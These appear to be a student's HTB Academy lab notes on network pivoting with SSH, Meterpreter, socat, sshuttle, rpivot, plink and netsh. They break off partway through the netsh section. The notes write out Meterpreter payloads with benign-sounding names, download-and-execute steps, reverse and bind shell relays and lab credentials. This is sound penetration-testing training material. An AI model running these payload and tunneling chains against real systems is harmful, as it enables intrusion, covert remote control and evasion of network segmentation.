# SSH Pivoting, Tunneling & Port Forwarding — Complete Notes
# All Topics Combined: SSH | Meterpreter | Socat | Sshuttle | Rpivot | Plink | Netsh | ICMP | DNS

> **Lab Target:** `10.129.181.180` (Ubuntu Pivot Host — ACADEMY-PIVOTING-LINUXPIV)
> **Credentials:** `ubuntu / HTB_@cademy_stdnt!`
> **Internal Windows Target:** `172.16.5.19`
> **Windows Pivot:** `10.129.42.198` (ACADEMY-PIVOTING-WIN10PIV)
> **Internal DC:** `172.16.5.19`
> **Internal Web Server:** `172.16.5.135`
> **Credentials:** ubuntu / HTB_@cademy_stdnt! | victor / pass@123 | htb-student / HTB_@cademy_stdnt!
> **Module:** Pivoting, Tunneling & Port Forwarding
> **Topics Covered:** ICMP Tunneling with ptunnel-ng | DNS Tunneling with dnscat2
> **Lab Target:** 10.129.182.64 (Ubuntu pivot) | 10.129.182.39 (Windows target)

---

## Table of Contents

1. [What is Port Forwarding?](#1-what-is-port-forwarding)
2. [Network Layout & Understanding the Lab](#2-network-layout--understanding-the-lab)
3. [SSH Local Port Forwarding](#3-ssh-local-port-forwarding)
4. [Dynamic Port Forwarding with SOCKS Tunneling](#4-dynamic-port-forwarding-with-socks-tunneling)
5. [Pivoting into the Internal Network via RDP](#5-pivoting-into-the-internal-network-via-rdp)
6. [Remote / Reverse Port Forwarding with SSH](#6-remote--reverse-port-forwarding-with-ssh)
7. [Meterpreter Tunneling & Port Forwarding](#7-meterpreter-tunneling--port-forwarding)
8. [Socat Redirection with a Reverse Shell](#8-socat-redirection-with-a-reverse-shell)
9. [Socat Redirection with a Bind Shell](#9-socat-redirection-with-a-bind-shell)
10. [SSH Pivoting with Sshuttle](#10-ssh-pivoting-with-sshuttle)
11. [Web Server Pivoting with Rpivot](#11-web-server-pivoting-with-rpivot)
12. [SSH for Windows: Plink.exe](#12-ssh-for-windows-plinkexe)
13. [Port Forwarding with Windows Netsh](#13-port-forwarding-with-windows-netsh)
14. [ICMP Tunneling with ptunnel-ng](#14-icmp-tunneling-with-ptunnel-ng)
15. [DNS Tunneling with dnscat2](#15-dns-tunneling-with-dnscat2)
16. [Full Lab Walkthrough — dnscat2 (Step by Step)](#16-full-lab-walkthrough--dnscat2-step-by-step)
17. [When to Use Each Technique](#17-when-to-use-each-technique)
18. [All Lab Answers Summary](#18-all-lab-answers-summary)
19. [Quick Reference Cheatsheet](#19-quick-reference-cheatsheet)

---

## 1. What is Port Forwarding?

Port forwarding is a technique that redirects network traffic from one port on one host to another port on a different host. It uses TCP as the primary communication layer and can be wrapped inside protocols like SSH or SOCKS. This is extremely useful in penetration testing when direct access to a target service is blocked by a firewall or network segmentation. By tunneling traffic through a compromised "pivot" host that sits between your attack machine and the target, you can reach services that would otherwise be completely inaccessible. Port forwarding is the core skill that enables network pivoting — the art of moving through networks by using each compromised host as a stepping stone.

---

## 2. Network Layout & Understanding the Lab

In this lab there are three machines involved in the exercises. The attack host (your Pwnbox or VPN machine) sits on the HTB network and can reach the Ubuntu pivot host directly. The Ubuntu server is the pivot host — it has two network interfaces, one facing your attack host and one facing the internal Windows network. The Windows machine at `172.16.5.19` sits entirely on the internal network and has no direct route back to your attack host. Understanding which machine can talk to which is the most important step before choosing your technique. Running `ifconfig` on the Ubuntu server reveals both NICs and makes the network topology clear.

```
[Attack Host 10.10.14.x]
        |
        | (can reach directly)
        |
[Ubuntu Pivot Host]
  ens192 → 10.129.181.180   (faces HTB / Attack Host network)
  ens224 → 172.16.5.129     (faces internal Windows network)
        |
        | (internal only)
        |
[Windows Target 172.16.5.19]
```

### Commands run to discover the topology

```bash
# SSH into the pivot host
ssh ubuntu@10.129.181.180
# Password: HTB_@cademy_stdnt!

# View all network interfaces on the Ubuntu pivot host
ifconfig
```

**What `ifconfig` shows:**
- `ens192` with IP `10.129.181.180` — the interface connected to HTB/your attack host
- `ens224` with IP `172.16.5.129` — the interface connected to the internal `172.16.5.0/23` network
- `lo` — the loopback interface `127.0.0.1`

> **Answer to lab question:** The Ubuntu server has **3** network interfaces (ens192, ens224, lo).

---

## 3. SSH Local Port Forwarding

### What it is

Local port forwarding lets you bind a port on your **local attack host** and forward all traffic sent to that port through SSH to a service running on the **remote server** (or somewhere the remote server can reach). The connection looks like this: you connect to `localhost:LOCALPORT` on your machine, and SSH secretly sends that traffic to `REMOTEHOST:REMOTEPORT` through the encrypted SSH tunnel. This is useful when a service like MySQL or an internal web server is running on the remote host but is not exposed to the internet — you can access it locally as if it were running on your own machine.

### When to use it

Use local port forwarding when you have SSH access to a server and want to access a service on that server (or reachable by that server) from your local machine. For example, MySQL running on localhost:3306 of the pivot host, or an Apache web server running on port 80 that is only accessible internally.

### Commands performed

```bash
# Forward local port 1234 to MySQL (port 3306) on the Ubuntu server
ssh -L 1234:localhost:3306 ubuntu@10.129.181.180
# -L means Local port forward
# 1234 = port on YOUR attack host to listen on
# localhost:3306 = where SSH server should forward traffic to (from its own perspective)
# ubuntu@10.129.181.180 = the SSH server (pivot host)

# Verify the port forward is active on your attack host
netstat -antp | grep 1234
# Shows SSH listening on 127.0.0.1:1234 — confirms the tunnel is open

# Scan the forwarded port to confirm the service is MySQL
nmap -v -sV -p1234 localhost
# -sV = detect service version
# Should show: 1234/tcp open mysql MySQL 8.0.x

# Forward multiple ports at once (MySQL + Apache)
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.181.180
# Each -L flag adds another forwarding rule
# Now localhost:1234 → remote MySQL, localhost:8080 → remote Apache
```

---

## 4. Dynamic Port Forwarding with SOCKS Tunneling

### What it is

Dynamic port forwarding is more powerful than local port forwarding because instead of forwarding one specific port to one specific destination, it turns your SSH client into a full **SOCKS proxy**. Any application that supports SOCKS can send traffic through this proxy, and SSH will forward it dynamically to whatever destination the application requests — across the entire internal network. This lets you scan entire subnets, browse internal web pages, and use any tool against any host in the internal network, all routed through your pivot host. The tool `proxychains` is used to force other tools (like Nmap, msfconsole, xfreerdp) to use the SOCKS proxy automatically.

### When to use it

Use dynamic port forwarding when you need to reach **multiple hosts or services** in an internal network you can't access directly, and you don't know in advance exactly which ports or IPs you need. It's the go-to technique for network reconnaissance through a pivot host.

### Commands performed

```bash
# Start the SOCKS proxy — SSH listens on local port 9050
ssh -D 9050 ubuntu@10.129.181.180
# -D = Dynamic port forward (creates SOCKS proxy)
# 9050 = local port on your attack host where the SOCKS listener runs
# All traffic sent to 127.0.0.1:9050 gets tunneled through SSH to the pivot host

# Verify proxychains config has the correct line
tail -4 /etc/proxychains.conf
# Should contain: socks4  127.0.0.1 9050
# If not, add it: echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# Ping sweep the internal network through the SOCKS tunnel
proxychains nmap -v -sn 172.16.5.1-200
# proxychains = routes all nmap packets through the SOCKS proxy at 9050
# -sn = ping scan only (no port scan) — discovers live hosts
# Routes: attack host → SOCKS:9050 → SSH tunnel → Ubuntu → internal network

# Scan specific Windows target through the tunnel
proxychains nmap -v -Pn -sT 172.16.5.19
# -Pn = skip ping (Windows firewall blocks ICMP)
# -sT = full TCP connect scan (required with proxychains — no half-open scans)
# Discovered: 445, 135, 139 (SMB), 3389 (RDP)
```

---

## 5. Pivoting into the Internal Network via RDP

### What it is

Once you have the SOCKS proxy running and you know the Windows target is at `172.16.5.19` with RDP open on port 3389, you can use `xfreerdp` through `proxychains` to get a full graphical desktop session on the Windows machine. This lets you interact with Windows exactly as if you were sitting in front of it. The key challenge is making sure xfreerdp uses NTLM or TLS authentication instead of Kerberos, since Kerberos requires a domain controller reachable from your machine (which it isn't — only the pivot host can reach it).

### When to use it

Use this when you have valid credentials for a Windows machine in the internal network, RDP (port 3389) is open, and you want an interactive graphical session rather than just a shell. It is useful for browsing the file system, reading files, or operating Windows tools interactively.

### Commands performed

```bash
# First attempt (fails due to Kerberos)
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore
# xfreerdp tries Kerberos auth → times out trying to reach kerberos.mit.edu

# Working command — force TLS security and specify domain
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
# /v: = target IP
# /u: = username
# /p: = password
# /d: = domain name (prevents Kerberos lookup, uses NTLM/TLS instead)
# /cert:ignore = ignore the self-signed certificate warning
# /sec:tls = force TLS security layer (bypasses Kerberos entirely)

# Once connected, read the flag on the Desktop
# In the RDP session open cmd.exe or PowerShell and run:
type C:\Users\victor\Desktop\Flag.txt
```

> **Lab Credentials:** `victor / pass@123` on domain `inlanefreight.local`

---

## 6. Remote / Reverse Port Forwarding with SSH

### What it is

Remote (reverse) port forwarding is the opposite direction of local port forwarding. Instead of YOU listening locally and forwarding to the remote server, you tell the **remote SSH server to listen on a port** and forward anything it receives back **to your attack host**. This is used when you want to receive a reverse shell from an internal machine (like the Windows target) that cannot route traffic directly to your attack host — it can only reach the Ubuntu pivot host. You trick the Windows machine into connecting to Ubuntu's port, and Ubuntu tunnels that connection back to your Metasploit listener.

### When to use it

Use reverse port forwarding when you need to catch a reverse shell from a machine that has no direct path to your attack host. The internal machine connects to the pivot host, and the pivot host relays that connection back to you. This is essential for getting Meterpreter or shell sessions from deep inside segmented networks.

### Commands performed

```bash
# STEP 1: On your attack host — create the Windows reverse shell payload
# LHOST = Ubuntu's internal IP (what Windows can reach)
# LPORT = port Ubuntu will listen on
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
# -p = payload type (HTTPS reverse shell for Windows 64-bit)
# LHOST = 172.16.5.129 (Ubuntu's ens224 IP — reachable by Windows)
# LPORT = 8080 (port Ubuntu will listen for the callback)
# -f exe = output format Windows executable
# -o = output filename

# STEP 2: Start Metasploit listener on attack host (port 8000)
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0    # listen on ALL interfaces
set LPORT 8000       # your local listener port
run

# STEP 3: Copy the payload to the Ubuntu pivot host
scp backupscript.exe ubuntu@10.129.181.180:~/
# scp = secure copy over SSH
# Copies backupscript.exe from your machine to Ubuntu's home directory

# STEP 4: On Ubuntu — start a Python web server so Windows can download the payload
ssh ubuntu@10.129.181.180
python3 -m http.server 8123
# Serves files from current directory on port 8123
# Windows will download backupscript.exe from http://172.16.5.129:8123/

# STEP 5: Set up SSH reverse port forward (new terminal on attack host)
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.181.180 -vN
# -R = Reverse port forward
# 172.16.5.129:8080 = Ubuntu listens on its internal IP, port 8080
# 0.0.0.0:8000 = forward received connections to attack host port 8000
# -v = verbose output (see connection logs)
# -N = no shell (just keep the tunnel open)

# STEP 6: In your RDP session on Windows — download and run the payload
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
C:\backupscript.exe
# Invoke-WebRequest downloads the payload from Ubuntu's HTTP server
# Running it triggers the reverse HTTPS connection back to Ubuntu:8080
# Ubuntu tunnels it through SSH to your Metasploit on port 8000
```

**Traffic flow:**
```
Windows (172.16.5.19)
  → connects to Ubuntu (172.16.5.129:8080)
    → SSH reverse tunnel
      → Attack Host Metasploit (0.0.0.0:8000)
        → Meterpreter session opens!
```

---

## 7. Meterpreter Tunneling & Port Forwarding

### What it is

Instead of using SSH for tunneling, Metasploit's Meterpreter session can serve as the entire pivot mechanism. Once you have a Meterpreter shell on the Ubuntu pivot host, you can use Metasploit's built-in `autoroute` module to add routing rules that tell Metasploit "send traffic destined for 172.16.5.0/23 through this Meterpreter session." Combined with Metasploit's `socks_proxy` module, this creates a SOCKS proxy identical to the SSH dynamic port forwarding method — but without needing SSH at all. Additionally, Meterpreter's `portfwd` command lets you forward specific ports directly through the session, giving you fine-grained control.

### When to use it

Use Meterpreter tunneling when you already have a Meterpreter session on a pivot host and want to avoid setting up additional SSH tunnels. It is also useful when SSH is not available on the pivot host, or when you want everything managed within a single Metasploit console.

### Commands performed

```bash
# STEP 1: Create a Linux Meterpreter payload for the Ubuntu pivot host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.43 LPORT=8080 -f elf -o backupjob
# linux/x64/meterpreter/reverse_tcp = Linux 64-bit reverse TCP Meterpreter
# LHOST = YOUR attack host IP
# -f elf = Linux executable format
# -o backupjob = output filename

# STEP 2: Start the Metasploit listener
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
# Waits for the Ubuntu server to connect back

# STEP 3: Copy payload to Ubuntu and execute it
scp backupjob ubuntu@10.129.181.180:~/
ssh ubuntu@10.129.181.180
chmod +x backupjob    # make it executable
./backupjob           # run it — triggers reverse connection to your listener
# Meterpreter session opens in your msf terminal

# STEP 4: Ping sweep from inside Meterpreter
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# Uses the pivot host to ICMP ping the entire 172.16.5.0/23 subnet
# Discovers live hosts: 172.16.5.19 (Windows) and 172.16.5.129 (Ubuntu itself)

# STEP 5: Add routes with AutoRoute
meterpreter > run autoroute -s 172.16.5.0/23
# Tells Metasploit: route 172.16.5.0/23 traffic through this Meterpreter session
# Equivalent to adding a network route through the pivot host

meterpreter > run autoroute -p
# -p = print/list all active routes
# Shows: 172.16.5.0 / 255.255.254.0 / Session 1
# This route (172.16.5.0/255.255.254.0) is what makes 172.16.5.19 reachable

# STEP 6: Start SOCKS proxy through Metasploit
meterpreter > bg    # background the session
msf6 > use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
# Creates a SOCKS4a proxy on your attack host port 9050
# All traffic through this proxy routes via the Meterpreter session

# Verify proxy is running
msf6 > jobs
# Should show Job 0: Auxiliary: server/socks_proxy

# STEP 7: Test routing with proxychains + Nmap
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
# Confirms RDP is reachable through the Meterpreter SOCKS tunnel

# STEP 8: Meterpreter portfwd — forward RDP directly to localhost
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# -l 3300 = listen on local port 3300 on your attack host
# -p 3389 = connect to remote port 3389 (RDP)
# -r 172.16.5.19 = remote host (Windows target)
# Now you can RDP directly without proxychains:

xfreerdp /v:localhost:3300 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
# Connects to localhost:3300 which Meterpreter forwards to 172.16.5.19:3389

# STEP 9: Meterpreter reverse port forwarding
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.43
# -R = reverse port forward
# -l 8081 = local port on attack host to receive connections
# -p 1234 = port on Ubuntu pivot host to listen on
# -L 10.10.14.43 = attack host IP to forward to

# Generate Windows payload pointing at Ubuntu's internal IP + port 1234
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
# Windows connects to Ubuntu:1234 → Ubuntu tunnels to attack host:8081 → Metasploit

# Set up handler for Windows shell on port 8081
msf6 > use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

---

## 8. Socat Redirection with a Reverse Shell

### What It Is

Socat (SOcket CAT) is a bidirectional relay tool that creates a pipe between two network channels without needing SSH tunneling at all. It acts as a pure TCP traffic redirector — whatever comes in on one port goes straight out to another IP and port. In a reverse shell scenario, the Windows target connects back to the Ubuntu pivot host where socat is listening, and socat silently forwards that connection to your Metasploit listener on the attack host. This technique is useful when you need a quick relay without the complexity of SSH tunnels, and it works independently of any authentication or encryption overhead.

### When to Use It

Use socat reverse shell redirection when you have shell/SSH access to a pivot host and need to catch a reverse shell from an internal machine. It is simpler than SSH reverse port forwarding and works when the internal target cannot reach your attack host directly but CAN reach the pivot host.

### Traffic Flow

```
Windows Target (172.16.5.19)
  │ runs backupscript.exe
  │ connects to Ubuntu:8080
  ▼
Ubuntu Pivot (socat listening on :8080)
  │ socat forwards to Attack Host:8000
  ▼
Attack Host Metasploit (:8000)
  │ catches Meterpreter session
  ▼
Shell on Windows!
```

### How We Solved It

**Problem encountered:** Port 80 was in use by Python3 (HTB Academy web service — PID 2790). Could not bind to 0.0.0.0:80.

**Fix:** Used port 8000 instead of port 80. Changed socat to forward to port 8000 and updated Metasploit LPORT to 8000.

### Commands Performed

```bash
# STEP 1: On Ubuntu pivot host — start socat redirector
# Kill any existing socat first
sudo pkill socat

# Start socat: listen on 8080, forward to attack host port 8000
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.43:8000
# TCP4-LISTEN:8080 = socat listens on this port on Ubuntu
# fork = handle multiple connections without exiting
# TCP4:10.10.14.43:8000 = forward everything to attack host port 8000
# Leave this running!

# STEP 2: On attack host — create Windows reverse shell payload
# LHOST = Ubuntu's internal IP (what Windows can reach)
# LPORT = port socat is listening on (8080)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
# -p = payload type
# LHOST = Ubuntu internal IP ens224 (172.16.5.129) NOT your attack host IP
# -f exe = Windows executable format
# -o = output filename

# STEP 3: Copy payload to Ubuntu for Windows to download
scp backupscript.exe ubuntu@10.129.181.180:~/
# Copies exe from attack host to Ubuntu home directory

# STEP 4: On Ubuntu — serve payload via HTTP
python3 -m http.server 8123
# Windows will download from http://172.16.5.129:8123/backupscript.exe

# STEP 5: Start Metasploit listener on attack host (port 8000)
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0    # listen on ALL interfaces
set LPORT 8000       # must match socat's destination port
run

# STEP 6: In Windows RDP session — kill old payload and download fresh one
# In PowerShell on Windows:
taskkill /F /IM backupscript.exe    # kill old running process
del C:\backupscript.exe             # delete old file
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
C:\backupscript.exe                 # execute the payload

# STEP 7: Metasploit catches the session
# You should see:
# [*] Meterpreter session 1 opened (10.10.14.43:8000 -> 127.0.0.1)
# meterpreter > getuid
# Server username: INLANEFREIGHT\victor
```

### Lab Answer

**"SSH tunneling is required with Socat. True or False?"**
**Answer: `False`** — Socat works purely at TCP level, no SSH needed.

---

## 9. Socat Redirection with a Bind Shell

### What It Is

A bind shell is the opposite direction of a reverse shell. Instead of the target connecting back to you (reverse), in a bind shell the **target opens a listener** and YOU connect TO the target. Socat in bind shell mode sits on the Ubuntu pivot host, listens for your incoming connection, and forwards it to the Windows target's bind shell listener. This is useful when outbound connections from the target are blocked by a firewall but inbound connections to the target are permitted from within the internal network.

### Reverse Shell vs Bind Shell Comparison

```
REVERSE SHELL (target connects out):
Windows ──connects to──► Ubuntu:8080 ──socat──► Attack Host:8000

BIND SHELL (you connect in):
Attack Host ──connects to──► Ubuntu:8080 ──socat──► Windows:8443
```

### When to Use It

Use bind shell redirection when the target machine blocks outbound connections (preventing reverse shells) but allows inbound connections. Also useful when your attack host IP changes frequently, since with bind shells you always connect TO the target rather than waiting for it to call back.

### How We Solved It

The key difference from reverse shell: no LHOST in the payload, and Metasploit uses RHOST instead of LHOST because YOU are connecting outward to the target.

### Commands Performed

```bash
# STEP 1: On attack host — create Windows BIND shell payload
# No LHOST needed — Windows is the listener
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
# bind_tcp = Windows opens a listener waiting for connections
# LPORT=8443 = port Windows will listen on
# No LHOST = bind shells don't call back, they wait

# STEP 2: Transfer payload to Ubuntu then to Windows
scp backupjob.exe ubuntu@10.129.181.180:~/

# On Ubuntu serve via HTTP
python3 -m http.server 8123

# In Windows RDP PowerShell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupjob.exe" -OutFile "C:\backupjob.exe"

# STEP 3: Execute bind shell on Windows
# In Windows RDP PowerShell:
C:\backupjob.exe
# Windows is now LISTENING on port 8443
# Nothing happens yet — you need to connect TO it

# STEP 4: On Ubuntu pivot host — start socat bind redirector
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
# TCP4-LISTEN:8080 = Ubuntu listens for YOUR incoming connection
# TCP4:172.16.5.19:8443 = forwards to Windows bind shell listener
# You connect to Ubuntu:8080, Ubuntu connects to Windows:8443

# STEP 5: On attack host — configure Metasploit bind handler
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.181.180   # Ubuntu's IP (NOT Windows!) — socat is the relay
set LPORT 8080             # socat's listening port on Ubuntu
run
# Metasploit connects TO Ubuntu:8080
# Socat forwards to Windows:8443
# Meterpreter session opens!

# STEP 6: Verify session
# [*] Meterpreter session 1 opened
# meterpreter > getuid
# Server username: INLANEFREIGHT\victor
```

### Lab Answer

**"What Meterpreter payload did we use to catch the bind shell session?"**
**Answer: `windows/x64/meterpreter/bind_tcp`**

---

## 10. SSH Pivoting with Sshuttle

### What It Is

Sshuttle is a Python-based tool that combines SSH tunneling with automatic iptables firewall rules to create a transparent network proxy. Unlike proxychains where you must prefix every command, sshuttle automatically routes ALL traffic destined for the target subnet through the SSH tunnel without any per-command configuration. It works by setting up iptables NAT rules on your attack host that intercept traffic to the specified network and redirect it through the SSH tunnel. This makes it the most seamless pivoting method — once started, every tool works normally without any proxy configuration.

### Sshuttle vs Proxychains

| Feature | Proxychains | Sshuttle |
|---|---|---|
| Setup | ssh -D 9050 + config file | Single command |
| Tool usage | Must prefix with `proxychains` | Use tools directly |
| How it works | SOCKS proxy | iptables NAT rules |
| Works with UDP | No | Limited |
| Requires | SSH + proxychains installed | SSH + sshuttle installed |

### When to Use It

Use sshuttle when you want the simplest possible setup and don't want to prefix every command with proxychains. It is ideal for interactive work where you're switching between many tools rapidly. The limitation is it only works over SSH — not over Meterpreter sessions or HTTP proxies.

### How We Solved It

This was the simplest task — one command sets up the entire tunnel and then tools work normally.

### Commands Performed

```bash
# STEP 1: Install sshuttle (if not already installed)
sudo apt-get install sshuttle -y
# Downloads and installs sshuttle from parrot/kali repos

# STEP 2: Start sshuttle tunnel
sudo sshuttle -r ubuntu@10.129.182.18 172.16.5.0/23 -v
# -r ubuntu@10.129.182.18 = SSH into Ubuntu pivot host as ubuntu user
# 172.16.5.0/23 = route ALL traffic to this subnet through the tunnel
# -v = verbose mode (shows iptables rules being added)
# Enter password: HTB_@cademy_stdnt!
# Leave this terminal running — it IS the tunnel

# What sshuttle does automatically:
# fw: iptables -w -t nat -N sshuttle-12300
# fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/23 -p tcp --to-ports 12300
# These rules intercept any traffic to 172.16.5.0/23 and route it through SSH

# STEP 3: Open NEW terminal — use tools WITHOUT proxychains
# Nmap directly (no proxychains prefix!)
sudo nmap -v -sT -p3389 172.16.5.19 -Pn
# Works because iptables redirects this traffic through the SSH tunnel automatically

# STEP 4: RDP directly without proxychains
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
# NO proxychains needed!
# sshuttle's iptables rules handle routing transparently

# STEP 5: When done — stop sshuttle
# Press Ctrl+C in the sshuttle terminal
# It automatically removes the iptables rules it created
```

### Lab Answer

**Optional exercise — submit:** `I tried sshuttle`

---

## 11. Web Server Pivoting with Rpivot

### What It Is

Rpivot is a reverse SOCKS proxy tool written in Python2 that is specifically designed for corporate network environments where direct connections inward are blocked. Unlike regular SOCKS proxies where you push traffic outward, rpivot works in reverse — the compromised internal machine (pivot host) connects OUTWARD to your attack host, establishing a tunnel through which you can send traffic inward. It has two components: `server.py` which runs on your attack host and waits for connections, and `client.py` which runs on the pivot host and connects back to server.py. Once connected, a SOCKS proxy is available on your attack host at the configured port, and proxychains routes traffic through it as normal.

### How Rpivot Differs from SSH -D

```
SSH Dynamic (-D):
Attack Host ──SSH connection──► Pivot Host ──► Internal Network
(YOU initiate the connection outward)

Rpivot:
Pivot Host ──client.py connects back──► Attack Host server.py
(PIVOT initiates the connection — useful when firewall blocks inbound SSH)
```

### When to Use It

Use rpivot when you cannot SSH into the pivot host directly (firewall blocks inbound SSH) but the pivot host CAN make outbound connections. Also useful in environments with NTLM-authenticated HTTP proxies — rpivot has built-in NTLM proxy support that SSH does not have.

### How We Solved It

**Problems encountered:**
- Port 9050 conflict: `Error binding socks proxy. Address already in use` — an old SSH -D tunnel was still using port 9050
- Firefox was very slow through the tunnel
- **Fix:** Used `curl` instead of Firefox, and used port 9051 to avoid conflict

### Commands Performed

```bash
# STEP 1: On attack host — clone rpivot
git clone https://github.com/klsecservices/rpivot.git
cd rpivot

# STEP 2: Kill any existing process on port 9050 first
sudo fuser -k 9050/tcp
sudo pkill -f "ssh -D"

# STEP 3: Start server.py on attack host
python2 server.py --proxy-port 9051 --server-port 9999 --server-ip 0.0.0.0
# --proxy-port 9051 = SOCKS proxy listens here (proxychains connects here)
# --server-port 9999 = port where pivot host's client.py connects back to
# --server-ip 0.0.0.0 = listen on all interfaces
# Leave this running and waiting for client connection

# STEP 4: Transfer rpivot to Ubuntu pivot host
# Open NEW terminal
scp -r rpivot ubuntu@10.129.182.31:/home/ubuntu/
# -r = recursive (copies entire folder including client.py)
# Password: HTB_@cademy_stdnt!

# STEP 5: SSH into pivot host and run client.py
ssh ubuntu@10.129.182.31
cd rpivot
python2 client.py --server-ip 10.10.14.43 --server-port 9999
# --server-ip = YOUR attack host IP (check with: ip a | grep tun0)
# --server-port 9999 = must match server.py's --server-port
# You see: "Backconnecting to server 10.10.14.43 port 9999"

# STEP 6: Confirm connection in server.py terminal
# You should see: "New connection from host 10.129.182.31, source port XXXXX"
# Tunnel is now established!

# STEP 7: Update proxychains to use port 9051
sudo nano /etc/proxychains.conf
# Change last line to: socks4  127.0.0.1 9051

# STEP 8: Access internal web server via proxychains curl
proxychains curl -s --max-time 10 http://172.16.5.135:80 | grep -i "HTB"
# --max-time 10 = give up after 10 seconds
# grep -i "HTB" = filter output to find the flag

# Alternative: save full page and read it
proxychains curl -s http://172.16.5.135:80 > output.html
cat output.html

# For NTLM-authenticated proxy environments (corporate networks):
python2 client.py --server-ip <AttackHostIP> --server-port 8080 \
  --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 \
  --domain <DomainName> --username <user> --password <pass>
# This bypasses corporate NTLM proxy authentication automatically
```

### Lab Answers

- **"From which host will server.py need to be run?"** → `Attack Host`
- **"From which host will client.py need to be run?"** → `Pivot Host`
- **Flag:** Found in the HTML source of `http://172.16.5.135:80` via proxychains curl

---

## 12. SSH for Windows: Plink.exe

### What It Is

Plink (PuTTY Link) is the command-line SSH client that comes with the PuTTY package for Windows. Before Windows 10 (2018), Windows had no built-in SSH client, so administrators used PuTTY and Plink to connect to SSH servers. In penetration testing, if you compromise an older Windows machine that already has PuTTY installed, you can use Plink to create SSH dynamic port forwards and SOCKS proxies — exactly like `ssh -D` on Linux — without uploading any new tools. This "living off the land" approach avoids detection by using software that already exists on the system.

### Plink vs SSH Equivalents

| Linux (Pwnbox) | Windows (Plink) | Purpose |
|---|---|---|
| `ssh -D 9050 ubuntu@host` | `plink -ssh -D 9050 ubuntu@host` | SOCKS proxy |
| proxychains | Proxifier | Route app traffic through proxy |
| `xfreerdp /v:target` | `mstsc.exe` | RDP client |

### When to Use It

Use Plink when your attack machine is a **Windows PC** (not Linux Pwnbox) and you need to create SSH tunnels for pivoting. Also useful during engagements when you land on a Windows host that has PuTTY already installed — you can pivot from WITHIN the compromised machine using tools already present, avoiding the need to upload new binaries.

### How to Perform It (Personal Windows PC Required)

```
NOTE: This task requires a personal Windows laptop/PC connected to HTB via VPN.
If you are using the Linux Pwnbox, use ssh -D instead — it does the same thing.
```

```cmd
# STEP 1: Download plink.exe to your Windows PC
# From: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
# Download plink.exe (standalone executable, no install needed)
# Save to C:\Tools\plink.exe

# STEP 2: Open cmd.exe on YOUR Windows PC and run plink
C:\Tools\plink.exe -ssh -D 9050 ubuntu@10.129.182.18
# -ssh = use SSH protocol
# -D 9050 = create SOCKS proxy on localhost:9050
# Type 'y' to accept host key on first connection
# Enter password: HTB_@cademy_stdnt!
# Leave this window running — it is your SOCKS tunnel

# STEP 3: Install Proxifier on your Windows PC
# From: https://www.proxifier.com/
# Proxifier = Windows equivalent of proxychains

# STEP 4: Configure Proxifier
# Profile → Proxy Servers → Add
# Address: 127.0.0.1
# Port: 9050
# Protocol: SOCKS5
# Click OK

# STEP 5: Set proxification rules
# Profile → Proxification Rules → Add
# Set ALL traffic to route through 127.0.0.1:9050
# This intercepts ALL Windows app network connections

# STEP 6: Open mstsc.exe (Remote Desktop Connection)
# Win + R → type mstsc → Enter
# Computer: 172.16.5.19
# Username: victor
# Password: pass@123
# Domain: inlanefreight.local
# Proxifier routes mstsc through Plink tunnel automatically!
```

### Linux Pwnbox Equivalent (What You Actually Use)

```bash
# These two commands replace ALL of Plink + Proxifier:
ssh -D 9050 ubuntu@10.129.182.18
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /d:inlanefreight.local /cert:ignore /sec:tls
```

### Lab Answer

**Optional exercise — submit:** `I tried Plink`

---

## 13. Port Forwarding with Windows Netsh

### What It Is

Netsh (Network Shell) is a built-in Windows command-line utility for network configuration. Among its many uses, netsh can create port proxy rules that forward traffic arriving on one port to a completely different host and port — acting like a simple port forwarder built into Windows itself. In penetration testing, when you compromise a dual-homed Windows machine (one interface facing you, one facing the internal network), you can use netsh to make that Windows machine relay your RDP, HTTP, or any TCP traffic into the internal network without installing any extra tools. This is another "living off the land" technique that uses tools built into Windows.

### When to Use It

